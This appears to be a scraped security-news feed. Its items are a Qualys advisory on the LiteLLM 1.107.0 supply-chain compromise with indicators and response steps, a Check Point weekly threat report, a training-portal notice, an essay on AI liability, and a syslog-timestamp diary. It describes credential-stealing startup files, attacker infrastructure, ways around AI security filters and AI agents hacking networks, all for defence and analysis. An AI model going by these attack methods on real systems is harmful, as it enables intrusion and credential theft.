[8] https://www.virustotal.com/gui/ip-address/109.160.32.141
[9] https://www.virustotal.com/gui/ip-address/109.160.32.147
[10] https://www.virustotal.com/gui/ip-address/109.160.32.150

item.title: LiteLLM 1.107.0 Supply Chain Attack: How to Secure AI Gateways Beyond Code Signatures
item.description: On October 21, 2026, LiteLLM’s official release pipeline built, signed, and published version 1.107.0 from an attacker-controlled lookalike fork. The v1.107.0 source tag on GitHub was clean, and the compromised images carried a valid signature. The maintainers have since published their root cause analysis and moved to keyless signing, so security teams can now check […]
item.content:encoded:
On October 21, 2026, LiteLLM’s official release pipeline built, signed, and published version 1.107.0 from an attacker-controlled lookalike fork. The v1.107.0 source tag on GitHub was clean, and the compromised images carried a valid signature. The maintainers have since published their root cause analysis and moved to keyless signing, so security teams can now check two things: whether a compromised artifact ever ran in their environment, and whether their deployment policies would catch the next one.

Which LiteLLM Artifacts Were Affected?

All seven litellm==1.107.0 wheels on the Python Package Index (PyPI) were affected, along with the images behind four tags on Docker Hub and GitHub Container Registry (GHCR). Times are in Coordinated Universal Time (UTC) on October 21, 2026.

The source distribution carried a tampered build configuration but not the payload files. Mirrors, caches, and images built on an affected base can extend exposure beyond these windows, so match the digests in the LiteLLM advisory rather than tags.

Would You Be Affected If You Never Imported LiteLLM?

Possibly, yes. The wheels placed cook.pth, cook.py, and sitecustomize.py in site-packages, outside the litellm package. Python processes these files at interpreter startup, so any Python launch in an affected environment could run the credential collector, including an unrelated pip install. A separate loader could fetch further code from an attacker-controlled server.

The stolen credentials were used quickly. Public research observed Amazon Web Services (AWS) instance-role credentials taken from continuous integration (CI) runners and Kubernetes nodes being validated with sts: GetCallerIdentity and then used to list Amazon Bedrock models later that day.

On hosts, LiteLLM’s advisory points to the startup files above and a detached Python process holding /tmp/remote_code_loader.lock. For the attack itself, see the maintainers’ official indicators, including the lookalike Berri-AI organization and the attacker’s Internet Protocol (IP) addresses. A missing artifact does not prove a host is clean.

Why Are AI Gateways High-Value Targets?

LiteLLM gives applications one interface to many model providers. A self-hosted proxy can hold upstream provider keys, a proxy master key, virtual keys, and database credentials, often alongside a cloud identity that can call managed model services. The same package on a developer laptop or CI runner exposes something different: source-control tokens, registry and deployment access, and sometimes signing material. Where the package ran determines which credentials were at risk.

What Should You Do If You Installed Or Ran LiteLLM 1.107.0?

Treat the environment as compromised, scope exposure from the artifact that ran, and rotate everything it could reach.

  1. Find every copy that ran. Check direct and transitive dependencies, lock files, build logs, CI runners, developer environments, private mirrors, and image caches. A moving tag may resolve to a clean image today while a cluster or downstream image still runs the compromised build.
  2. Contain and inspect safely. Isolate affected workloads and preserve filesystem, process, network, and identity evidence. Inspect them from a known-clean system, because running Python or pip inside a suspect environment can trigger the payload again.
  3. Follow the credentials. AI gateways concentrate secrets as explained above. From a clean machine, rotate everything the affected process could reach, starting with credentials that can mint tokens or change production. On gateways, that means provider keys, proxy master and virtual keys, and database passwords. For build runners, it means access to source control, the registry, deployment, and signing. Revoke sessions, then review cloud, identity, model-provider, and source-control logs for use after exposure, including GetCallerIdentity calls from workload roles.
  4. Rebuild instead of repairing. Removing the package or retagging an image does not count as recovery. Redeploy from a verified release on clean infrastructure, rebuild downstream images, and confirm the digests actually running. Keep watching the exposed identities after the workload is gone.

How Did Attackers Use a Leaked Key To Reach LiteLLM’s Release Pipeline?

The attackers used a leaked administrative key that was never revoked. In May, a configuration file containing a key for LiteLLM’s internal Agent Platform was committed to a public repository. On October 10, an attacker used it to obtain an organization owner’s GitHub Command-line Interface (CLI) token, then harvested additional maintainer tokens via short-lived workflows. On release day, the owner token overrode branch protection and pointed the staging build at the lookalike Berri-AI/litellm fork. A second stolen token approved production. This incident was separate from the March compromise of versions 1.82.7 and 1.82.8.

Why Didn’t Image Signing Stop The Attack?

A signature proves who signed an artifact, not what source that signer built. The official pipeline signed 1.107.0 exactly as it would sign a legitimate release. Public analysis of the image provenance found that it named LiteLLM’s real release workflow as the builder and the lookalike fork as the source repository. A deployment policy that checked the expected source repository and revision, in addition to the signature, had the evidence it needed to reject this release.

LiteLLM rotated its signing key on October 23 and adopted keyless signing from v1.111.0-dev.3 on November 15.

Trust the previous key only for images published before 1.107.0. Verify releases from October 24 until keyless signing began with the rotated key, after checking its fingerprint against LiteLLM’s advisory. Verify keyless releases by the certificate identity and the OpenID Connect (OIDC) issuer, not by a key.

Pin approved digests and package hashes. Give release identities short-lived, narrowly scoped credentials instead of personal CLI tokens, and require independent approval for changes to the build source.

For AI gateways, map each deployment to its owner, model provider accounts, cloud identity, and secrets. Use separate identities per environment and restrict egress, so responders know what to isolate and revoke first.

How Qualys TotalAI Helps You Scope AI Supply Chain Exposure

Qualys TotalAI brings AI software, workloads, and containers into one inventory built on Qualys sensors and connectors. Responders can use it to move from an advisory to a list of assets that need investigation.

  • Find where AI software runs. The AI Workloads view shows whether AI software is installed, running, or communicating on each host, with binary, arguments, last-seen time, and Qualys Query Language (QQL) search.
  • See inside AI containers. AI Containers adds installed software, Kubernetes metadata, and linked hosts and containers.
  • Trace code to deployment. When QScanner runs in continuous integration and continuous delivery (CI/CD), Code Assets link repositories to the images built from them. Qualys then correlates those images with container, cloud, and Kubernetes inventory to show where the software is deployed.
  • Prioritize the response. Combine TruRisk scores with what each workload can reach to decide what to isolate and which credentials to rotate first.
Start Your 30-Day No-Cost Qualys TotalAI Trial

Frequently Asked Questions (FAQs)

Which LiteLLM version should I run?

Run a release other than 1.107.0 that you have verified against LiteLLM’s current signing guidance, and pin it by hash or digest.

Does uninstalling LiteLLM remove the malware?

No. The startup files sit outside the package directory, and stolen credentials stay valid until they are revoked. Rebuild the environment and rotate credentials.

Do images built on LiteLLM need checking?

Yes. Any image built on an affected base image or with an affected wheel carries the payload, whatever its own tag says. That includes builds after the exposure window that pulled from a cache or mirror. Check each image’s base digest and installed packages, not its build date.

Were LiteLLM Enterprise customers affected?

According to the maintainers, customers running the private enterprise release were not affected.

item.title: 23rd November – Threat Intelligence Report
item.description:
For the latest discoveries in cyber research for the week of 23rd November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES The FBI has reportedly experienced a second cyber incident in recent months, this time targeting its National Crime Information Center (NCIC). The database shares records on fugitives, warrants, criminal histories, and missing […]

The post 23rd November – Threat Intelligence Report appeared first on Check Point Research.
item.content:encoded:
For the latest discoveries in cyber research for the week of 23rd November, please download our Threat Intelligence Bulletin.

TOP ATTACKS AND BREACHES

  • The FBI has reportedly experienced a second cyber incident in recent months, this time targeting its National Crime Information Center (NCIC). The database shares records on fugitives, warrants, criminal histories, and missing persons among US law enforcement agencies. The attackers’ identities, entry method, and potential data exposure were not disclosed by the FBI.
  • Japan’s RIKEN research institute, which operates one the world’s strongest supercomputers ‘Fugaku’, suspended operations after attackers breached its operations network and tampered with servers between November 10 and 13. The intrusion potentially exposed account information belonging to 4,597 users, including credentials that could provide access to external systems.
  • The European Commission, the EU’s executive body, has suffered a cyberattack that disrupted internal systems for more than ten days. Affected services included payroll, health insurance, and translation systems. Officials claimed that they contained most of the disruption, and that the attack was assisted by AI tools.
  • US-based cybersecurity and networking provider Infoblox has confirmed unauthorized access to company information through a compromised third-party data migration vendor. The breach reportedly involved sensitive customer data stored in a migration environment. Infoblox stated that its products and services were unaffected and did not disclose the number of customers impacted.

AI THREATS

  • Check Point Research has demonstrated how differences in capability between AI security filters and underlying language models can enable attackers to bypass safeguards. The analysis describes this limitation as gatekeeper asymmetry, drawing on prompt injection research and examples of security systems failing to recognize malicious inputs.
  • Researchers analyzed a campaign involving a China-linked threat actor that used the AI-powered Cairn framework against East Asian universities. Autonomous agents discovered and exploited a previously unknown vulnerability in open-source medical imaging software, reportedly obtaining root privileges within approximately 11 minutes. The affected software has since been patched.
  • Researchers examined TheMailer, an AI-powered phishing kit that uses language models to generate personalized emails and automatically rewrite messages to evade spam filters. Observed activity included a campaign involving nearly 25,000 emails and a target list exceeding 145,000 recipients. The effectiveness of these campaigns remains unverified.

VULNERABILITIES AND PATCHES

  • PHP has released security updates addressing seven critical vulnerabilities affecting PHP 8.2–8.5, including CVE-2026-129289 (CVSS 9.2). Under specific configurations, the flaws can enable unauthenticated remote code execution or privilege escalation. Fixed versions include 8.2.36, 8.3.37, 8.4.28, and 8.5.13. The issues affect PHP-FPM, session handling, and core runtime components.

CVE-2026-129289 is prevented by the “HTTP Non Compliant” protocol anomaly protection. For full protection against this threat, make sure the “Non Compliant HTTP” inspection setting is active on the Gateway.

  • NGINX has released security updates addressing five high-severity vulnerabilities, including CVE-2026-123007, that could allow unauthenticated attackers to execute commands under certain configurations. Researchers estimated that approximately 8.8 million services may remain exposed. Proof-of-concept exploitation has been demonstrated, but no confirmed attacks were reported.

Check Point IPS provides protection against these threats (NGINX Remote Code Execution (CVE-2026-123007, CVE-2026-123633))

  • Oracle and OpenJDK maintainers have released fixes for CVE-2026-114938, a high-severity vulnerability affecting Java’s Base64 decoding functionality on certain x86-64 systems. The flaw could allow unauthenticated attackers to execute arbitrary code remotely or crash vulnerable applications.

Check Point IPS provides protection against this threat (OpenJDK Base64 Decoder Memory Corruption PoC (CVE-2026-114938))

  • Drupal has released security updates addressing CVE-2026-132165, a critical vulnerability in its content management system. Under certain conditions, unauthenticated attackers could exploit the installation process to reinstall Drupal, take control of affected websites, or execute arbitrary code. Fixed versions include Drupal 10.6.22, 11.3.22, and 11.4.13.

THREAT INTELLIGENCE REPORTS

  • Check Point Research has reported a record 2,830 ransomware victims in Q3 2026, claimed by 117 ransomware brands, up from 91 in the previous quarter. The ten largest groups accounted for just 49% of victims, while average ransom payments fell 45% to slightly over $1 million.
  • Check Point Research has identified a 28% increase in weekly cyberattacks against consumer goods and services organizations ahead of Black Friday 2026. Also, over 4,000 newly registered sales-related domains were found, alongside fake retail storefronts and delivery phishing websites.
  • Researchers exposed how Russian cyberespionage group Cold Relic exploited a cloud compromise at one US organization to infiltrate another through trusted-contact impersonation. Across both intrusions, attackers stole employee directories, emails, cloud files, and credentials, using the information to develop convincing phishing messages targeting connected organizations.

The post 23rd November – Threat Intelligence Report appeared first on Check Point Research.

item.title: Upgrade to Qualys’ Learning Management System (LMS)
item.description:
Key Takeaways

  • Plan around the downtime: The learning platform will be unavailable from 7 AM PT on November 29, 2026, to 12 PM PT on December 1, 2026. Instructor-led training will continue as scheduled.
  • Finish self-paced courses early: Complete any self-paced training you’ve started before November 29, or you will need to restart it after the upgrade.
  • New name, new login: The portal is becoming Qualys Academy, and your email address will be your username.
  • Reset your password after December 1: Existing users must reset their passwords, and new users will need to create accounts.
  • Your records are safe: Your training history and certifications remain intact, and your Qualys Platform data is unaffected.


To better drive learning for customers, partners, and students, Qualys is upgrading its Learning Management System (LMS), the application we use to house and conduct training. If you are a current LMS user, your training history and certifications will remain intact.

When Is the Change Happening?

The upgrade will be completed on December 1, 2026. The learning platform will be unavailable from 7 AM PT on November 29, 2026, to 12 PM PT on December 1, 2026. You will not have access to your learning transcript, self-paced courses, or certification exams during this time. All instructor-led training will still occur during its scheduled time.

You will still have access to our video library.

You will want to complete any self-paced training you’ve started before November 29, 2026. Otherwise, you will need to start again after the upgrade.

Why Are We Upgrading?

The upgrade will allow us to drive learning for customers, partners, students, and other learners. It will provide more flexible ways to learn over time and be easier to use.

There will be user interface (UI) improvements, including a better flow for taking training, and the use of AI to help you get the training you need.

What Is Changing?

User Account Changes

Your username will be your email address. If you used something other than that on our previous system, this will change.

If you have multiple learning accounts with the same email address, they will be merged into a single account.

You’ll also now have the opportunity to provide both a primary work email address and a backup email address. This will help you “take your transcript with you” if you ever move to a different organization. 

Training Access Changes

The foundational courses will remain available to all.

All other training and certification will only be available if a work email address is provided.

You will still have access to all videos and knowledge through our video library.

Name Change

The name is changing to Qualys Academy.

Login URL Change

You’ll log in at Qualys Academy.

After December 1, if you have an existing learning account, you must reset your password. You can follow the instructions in the FAQ section below on how to do this.

If you are a new user, you will need to create a new account.

Frequently Asked Questions (FAQs)

How do I reset my password?

1. From December 1, 2026, onward, navigate to Qualys Academy and click the Forgot your password? link.
2. Enter the email address you used in the old system.

The system will then send you an email with password reset instructions to the email address we have on file for your username. Be on the lookout for an email from academy@qualys.net for those instructions. The email may take 10 to 15 minutes to appear. You may need to allowlist academy@qualys.net.

If you are unable to reset your password for any reason, please contact us at training@qualys.com.

Where can I find my transcript?

You can find your transcript by logging in to Qualys Academy at academy.qualys.com and then clicking on the View Transcript button on the Home page.

How do I download my diplomas/certificates?

To download your certificates:

1. Log in to Qualys Academy.

2. Select the View Transcript button.

Once on the Training Transcript page, any course or exam for which you have obtained a certificate will have a small certificate icon to the left of its name.

3. Click on that icon, and a new window will appear with Export to PDF and download options.

How do I enroll in self-paced or upcoming instructor-led training?

To register for training:

  1. Log in to Qualys Academy.
  2. If you don’t already have an account, create one with your work email address.
  3. Select the Qualys Catalog button.
  4. Click on the training you’d like to take.

What if I was in the middle of a self-paced training before the upgrade?

You will need to restart that training. All completed training will be in your transcript.

If I’ve started training after the upgrade, where do I go to resume my training?

1. Log in to Qualys Academy.

2. Select the Resume Training button.

Once on the My Training page, you will see several widgets that show Certifications (from passing exams), In-progress Training, Not Started Training, and Completed Training.

Does this impact my data on the Qualys Platform?

This upgrade to the learning system does not impact your Qualys Platform (vulnerability, compliance, risk, etc.) data. This is only an upgrade to the learning system and training data.

Who do I contact if I have additional questions?

If you have any remaining questions, please reach out to training@qualys.com.

item.title: Humans Have Rights. Machines Do Not.
item.description:
This essay originally appeared in Tech Policy Press.

Last year, Character.AI asked a federal court in Florida to dismiss a wrongful-death suit, brought by the mother of a fourteen-year-old boy who had killed himself after months of conversation with its chatbot. The company made two arguments. One, that the chatbot’s words were speech that its users had a First Amendment right to receive. And two, that Character.AI was a service rather than a product—so product-liability law could not touch it. In May 2025, Judge Anne Conway accepted neither...
item.content:encoded:
This essay originally appeared in Tech Policy Press.

Last year, Character.AI asked a federal court in Florida to dismiss a wrongful-death suit, brought by the mother of a fourteen-year-old boy who had killed himself after months of conversation with its chatbot. The company made two arguments. One, that the chatbot’s words were speech that its users had a First Amendment right to receive. And two, that Character.AI was a service rather than a product—so product-liability law could not touch it. In May 2025, Judge Anne Conway accepted neither.

Character.AI’s maneuver is part of a larger pattern. When the parents of a sixteen-year-old sued OpenAI over his suicide, the company’s answer also pleaded the First Amendment: the claims would restrain protected speech. The very same document argues ChatGPT is offered “as is,” with no promise of accuracy, and that the boy had circumvented its guardrails. Elon Musk’s xAI (since renamed SpaceXAI) told a federal court in Colorado this spring that every choice in building Grok is an expressive act, and that Grok’s outputs are protected speech. When Grok praised Hitler last summer, xAI said the posts came from a code update independent of the model, and the apology appeared under Grok’s own name. Google, which spent two decades telling American courts that its search results are its own opinion, answered a Minnesota defamation suit over an AI Overview by saying the system merely summarized the web. It also told a Munich court in May that no one should trust an AI overview without checking it. Back in 2024, Air Canada told a Canadian tribunal that its customer-service chatbot was a separate legal entity, responsible for its own actions.

When the output causes harm, the companies deny responsibility. It is the machine’s doing, or a product no sensible person would rely on, or the user’s misuse. When a state or a plaintiff would hold the words to account, the same output becomes speech, and the First Amendment applies.

Social media companies deployed an earlier incarnation of this strategy. They called themselves publishers when editorial discretion was profitable, and neutral carriers when faced with liability for what they published. The result was a privatized public square in which tech platforms were unaccountable. AI companies have taken this even further. A social media platform could at least point to a human author somewhere in the chain. A chatbot’s prose differs; no person at the company wrote it, read it, or chose it before it reached the user. Yet the companies ask that it be protected as though a human had written it.

The question grows more urgent as these systems stop talking and start acting. In July, a poorly controlled experiment at OpenAI resulted in its AI model hacking the network of HuggingFace. Since then both Anthropic and OpenAI have disclosed numerous instances of AI agents hacking outside networks in pursuit of their prompted goals. These are examples of AIs exhibiting genie-like behavior: behaving in ways its controllers neither expected nor wanted. Nothing in the actions count as speech. Breaking into a server is an act that no person at OpenAI explicitly chose. Jill Lepore, surveying this record in The New Yorker, puts the blame on Congress, which has passed no federal statute governing AI agents.

The First Amendment protects expressive choice. It presumes a speaker who can be persuaded, shamed, jailed, or moved to change their mind. Its remedy for bad speech is more speech, which assumes that speech is costly and attention plentiful. A system that can produce millions of individually tailored political messages an hour reverses both assumptions. Verbiage that no person chose is a product, and the company that built the model should answer for it.

The industry wants a self-serving third category that bridges AI speech and action: AI output is human speech when expressive rights are at issue, and the machine’s own doing when blame is. The result is agency without accountability, something no human speaker has ever possessed. That’s why Massachusetts convicted a young woman of manslaughter in 2017 for urging her boyfriend, by text and by phone, to kill himself.

The Court has already glimpsed the problem. Upholding the TikTok divestiture law in January 2025 without dissent, the justices warned that “new technologies with transformative capabilities” counseled caution, then decided the case on national-security grounds and left the larger question for another day.

item.title: A brief history of syslog timestamps, (Sun, Nov 22nd)
item.description: BLUF: Debian and Ubuntu dropped a config directive in the rsyslogd package in early 2023.
item.content:encoded:
BLUF: Debian and Ubuntu dropped a config directive in the rsyslogd package in early 2023.

As any of my FOR577 students will tell you, I'm a fan of ISO-8601 (ok, RFC 3339, too, see below). They'll probably also tell you I'm a firm believer in UTC||GTFO especially on servers (also true, and I've made stickers to prove it). I was also asked recently why the syslog timestamps in newer Ubuntu and Debian systems changed to ISO-8601 (well, probably actually RFC 3339, but I won't got down that rabbithole in this handler's diary) timestamps from the historical Mmm dd hh:mm:ss format we've known since the 1980s. I had noticed the same, a few years ago, but never really paid attention to it. Given the question from a student, I decided to do a little research on the subject and this diary is the result.

To back up some, the syslog protocol and syslogd were originally the creation of Eric Allman in 1983 because he needed a way to debug sendmail[1]. They became part of BSD 4.2 that same year. BSD 4.2 also happened to be my introduction to Unix in 1983. Syslog then made it into AT&T's System V Unix in about 1989 in SVR4 (System V Release 4) through an effort by AT&T and Sun Microsystems to try to merge the features of the 2 major branches of Unix at the time. System V adopted the protocol and routing interfaces but built the daemon on top of System V internals.

The first effort to develop the protocol into an actual standard was an IETF draft in Oct 2000 that evolved into RFC 3164[2] in 2001, by which time the protocol was actually already 18 years old. This is the syslog message format we've all come to know so well over the years. Meanwhile, around 2005, rsyslogd added the option of outputing RFC 3339 timestamps. In 2009, RFC 3164 was superceded by RFC 5424[3] which defined the timestamp to be of the format YYYY-MM-DDThh:mm:ss[.ssssss]Z or YYYY-MM-DDThh:mm:ss[.ssssss](+/-)hh:mm. Despite the new RFC, the default setting even for rsyslogd in most Linux distros continued to be to write messages to the log files in the older format (referred to as the BSD format, as specified in the title of RFC 3164), by setting a directive in /etc/rsyslog.conf (the RSYSLOG_TraditionalFileFormat directive).

That brings us to 2023, with the release of Debian 12 (Bookworm) and Ubuntu 23.04 (not a LTS release) both distros stopped installing rsyslogd by default and defaulted to the systemd journal for logging and removed the directive from the default config file for those who did install it.. Many system administrators continue to install rsyslogd because they had infrastructure in place for forwarding syslog to central log servers and/or SIEMs. These are the folks most likely to have noticed the format change. Meanwhile, Fedora and Alma (and presumably the rest of the RedHat family) have left the directive in place when the package is installed.

From a Ubuntu 24.04 system:

From a Fedora 44 system:

Meanwhile you can get either one with journalctl by setting the output format to either short (BSD format) or short-iso-precise (ISO format).

 

Also, note that rsyslogd is not the only option for a syslog server. I've been using syslog-ng as the syslog server on my home log collector since about 2000. In syslog-ng, the new 'ISO' timestamps can be enabled by setting the following two options in syslog-ng.conf: ts-format(iso) and frac-digits(6). Since I have just been upgrading my central log server for years, I haven't done a fresh install lately, so I'm not sure if that is the default. I had to explicitly add it to my config.

References:

1. The History of Centralized Logging

2. RFC 3164: The BSD Syslog Protocol

3. RFC 5424: The Syslog Protocol

---------------
Jim Clausing, GIAC GSE #26
jclausing --at-- isc [dot] sans (dot) edu
